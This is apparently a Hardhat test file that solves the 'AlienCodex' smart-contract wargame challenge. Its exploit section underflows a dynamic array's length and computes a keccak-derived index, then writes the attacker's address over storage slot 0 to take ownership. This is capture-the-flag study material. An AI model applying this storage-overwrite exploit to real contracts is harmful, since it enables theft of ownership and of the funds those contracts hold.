const { ethers } = require('hardhat');
const { expect } = require('chai');
const { BigNumber } = require('ethers');

describe('[Challenge] AlienCodex', function () {

    let deployer, attacker;
    
    before(async () =>{
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        const network = await ethers.provider.getNetwork();
        const chainID = network.chainId
        
        if (chainID == 5){ // goerli testnet
            /** connect to Dapp in goerli **/
            [attacker] = await ethers.getSigners();
            const ContractFactory = await ethers.getContractFactory('AlienCodex');
            this.target = ContractFactory.attach("");
            
        } else { // local network - hardhat  
            /** local test **/
            [deployer, attacker] = await ethers.getSigners();
            const ContractFactory = await ethers.getContractFactory('AlienCodex', deployer);
            this.target = await ContractFactory.deploy();
        }
    });

    it('Exploit', async () => {
        /** CODE YOUR EXPLOIT HERE */
        // Verify that the owner is at storage[0]
        console.log(`\t reading contract owner...`);
        console.log(`\t owner: ${await this.target.owner()}`); // at storage[0]
        console.log(`\t storage[0]: ${await ethers.provider.getStorageAt(this.target.address, 0)}`);
        // make contract
        console.log(`\t executing make_contact()...`);
        let makeTX = await this.target.connect(attacker).make_contact(); await makeTX.wait();
        console.log(`\t contact   : ${await this.target.contact()}`);
        console.log(`\t storage[0]: ${await ethers.provider.getStorageAt(this.target.address, 0)}`);
        // craft payload
        console.log(`\t crafting payload content...`);
        let content = ethers.utils.hexZeroPad(ethers.utils.hexConcat(["0x01", attacker.address]), 32);
        console.log(`\t attacker  : ${attacker.address}`);
        console.log(`\t content   : ${content}`);
        // underflow codex.length to uint256.MAX for having ability to access to any index 
        console.log(`\t underflow attack to increasing codex.length underflow...`);
        console.log(`\t storage[1] before : ${await ethers.provider.getStorageAt(this.target.address, 1)}`);
        let retractTX = await this.target.connect(attacker).retract(); await retractTX.wait();
        console.log(`\t storage[1] after  : ${await ethers.provider.getStorageAt(this.target.address, 1)}`);
        // save content to storage[0] with overflow attack
        console.log(`\t recording content to codex[0]...`);
        let slotIndex = 1; // slot of `bytes32[] codex`
        let slotIndexHash = ethers.utils.solidityKeccak256(['uint256'], [slotIndex]);
        console.log(`\t slotIndexHash: ${slotIndexHash}`);
        let offset = BigNumber.from("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff")
            .sub(BigNumber.from(slotIndexHash))
            .add(1);
        console.log(`\t offset to storage[0] : ${offset}`);
        let reviseTX = await this.target.connect(attacker).revise(offset, content); await reviseTX.wait();
        // check owner
        console.log(`\t owner : ${await this.target.owner()}`);
    }).timeout(0);

    after(async () => {
        /** SUCCESS CONDITIONS */
        expect(await this.target.owner()).to.be.eq(attacker.address);
    });
});